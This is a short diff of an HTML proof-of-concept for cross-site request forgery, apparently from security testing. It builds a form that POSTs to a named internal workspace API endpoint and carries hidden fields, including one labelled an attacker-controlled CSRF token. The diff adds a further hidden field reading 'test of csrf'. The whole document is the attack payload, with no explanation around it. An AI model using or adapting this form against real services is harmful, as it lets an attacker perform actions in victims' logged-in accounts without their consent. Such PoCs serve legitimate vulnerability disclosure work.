@@ -2,6 +2,7 @@
 <html>
 <body>
 <form action="https://docs.superhuman.com/internalAppApi/workspaces" method="POST" enctype="application/json">
+  <input type="hidden" name="name" value="test of csrf">
   !-- Attacker-controlled CSRF token -->
   <input type="hidden" name="name" value="NSMGLeytgZFX5OXg">
 </form>
